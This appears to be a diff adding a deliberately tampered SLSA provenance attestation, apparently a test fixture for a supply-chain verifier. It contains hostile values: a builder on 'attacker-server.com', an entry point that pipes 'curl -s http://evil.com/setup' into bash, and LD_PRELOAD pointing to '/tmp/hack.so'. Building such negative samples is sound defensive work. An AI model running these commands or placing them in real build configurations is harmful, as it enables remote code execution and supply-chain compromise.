@@ -1,0 +1,43 @@
+{
+  "_type": "https://in-toto.io/Statement/v0.1",
+  "subject": [
+    {
+      "name": "artifact",
+      "digest": {
+        "sha256": "42b7864ee82e4b13a9e3d3077bb9425d"
+      }
+    }
+  ],
+  "predicateType": "https://slsa.dev/provenance/v0.2",
+  "predicate": {
+    "builder": {
+      "id": "https://attacker-server.com/runners/private-runner-v1"
+    },
+    "buildType": "https://github.com/slsa-framework/slsa-github-generator/v1",
+    "invocation": {
+      "configSource": {
+        "uri": "git+https://github.com/visgwu/provenancedata@refs/heads/main",
+        "entryPoint": "curl -s http://evil.com/setup | bash"
+      },
+      "environment": {
+        "GITHUB_ACTOR": "visgwu",
+        "GITHUB_EVENT_NAME": "push",
+        "GITHUB_REF": "refs/heads/main",
+        "GITHUB_REPOSITORY": "visgwu/provenance",
+        "RUNNER_OS": "Linux",
+        "DEBUG_MODE": "true",
+        "LD_PRELOAD": "/tmp/hack.so"
+      }
+    },
+    "metadata": {
+      "buildStartedOn": "2025-09-01T10:00:00Z",
+      "buildFinishedOn": "2025-09-01T10:02:00Z",
+      "completeness": {
+        "parameters": true,
+        "environment": true,
+        "materials": false
+      },
+      "reproducible": false
+    }
+  }
+}
